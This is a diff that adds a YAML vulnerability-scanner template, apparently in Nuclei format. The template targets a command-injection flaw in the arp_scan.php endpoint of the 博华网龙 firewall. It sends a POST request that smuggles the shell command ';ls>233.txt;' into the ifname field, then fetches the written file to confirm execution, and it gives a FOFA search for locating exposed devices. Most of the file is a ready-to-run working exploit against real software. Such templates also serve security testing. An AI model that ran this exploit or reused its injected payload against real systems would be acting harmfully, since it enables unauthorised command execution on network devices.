@@ -1,0 +1,55 @@
+id: poc-fh40n82wpbfua7ol
+info:
+  name: 博华网龙防火墙系统 arp_scan命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fh40n82wpbfua7ol'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: fh40n82wpbfua7ol
+    fofa: title="博华网龙"
+http:
+- raw:
+  - 'POST /firewall/arp_scan.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
+
+    Connection: keep-alive
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+    Accept-Encoding: gzip, deflate, br
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: 24
+
+    scan=1&ifname=;ls>233.txt;
+
+
+    上传定位'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /firewall/233.txt HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
+
+    Connection: keep-alive
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+    Accept-Encoding: gzip, deflate, br'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
